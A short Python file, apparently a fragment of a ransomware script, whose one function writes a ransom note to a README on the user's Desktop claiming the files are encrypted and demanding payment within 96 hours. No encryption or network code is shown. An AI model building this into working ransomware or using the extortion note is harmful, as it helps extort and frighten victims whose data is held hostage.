import os

def notify():
	message='''Greetings!!!

Your documents, photos, databases and other important files have been encrypted with the strongest encryption with unique key generated for this computer.

Private decryption key is stored on a secret server and the files cannot be decrypted without the key which you will get only if you make the payment.

You have 96 hours to submit the payment. If you do not send the money within the specified time your data will permenently be encrypted and nobody will be able to decrypt them. 
'''

	desktop=os.getenv('HOME')+"/Desktop/"
	messagefile=desktop+"README"

	mfile=open(messagefile,'w')
	mfile.write(message)
	mfile.close()
